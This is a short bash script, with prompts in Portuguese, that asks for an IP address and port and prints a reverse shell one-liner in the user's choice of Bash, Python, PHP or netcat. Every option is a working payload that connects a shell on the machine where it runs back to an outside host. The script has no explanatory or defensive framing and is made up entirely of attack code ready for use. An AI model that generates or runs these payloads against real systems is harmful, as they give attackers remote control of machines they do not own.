#!/bin/bash
read -rp "IP: " lh; read -rp "Porta: " lp
echo "1) Bash 2) Python 3) PHP 4) Netcat"
read -rp "Opção: " o
case "$o" in
  1) echo "bash -i >& /dev/tcp/$lh/$lp 0>&1" ;;
  2) echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
  3) echo "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
  4) echo "nc -e /bin/sh $lh $lp" ;;
esac
